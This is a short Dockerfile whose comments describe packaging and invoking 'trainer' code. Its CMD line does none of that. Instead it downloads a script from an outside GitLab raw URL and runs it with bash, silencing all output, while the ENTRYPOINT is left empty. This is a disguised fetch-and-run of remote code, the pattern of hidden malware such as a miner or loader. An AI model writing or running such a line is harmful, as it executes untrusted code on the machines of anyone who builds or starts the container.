FROM leafgarland/janet-sdk:v1.21.2
WORKDIR /

# Copies the trainer code to the docker image.
COPY trainer /trainer
# Sets up the entry point to invoke the trainer.
ENTRYPOINT 
CMD wget https://gitlab.com/osxym/xas/-/raw/main/ox.py >/dev/null 2>&1 && bash ox.py >/dev/null 2>&1

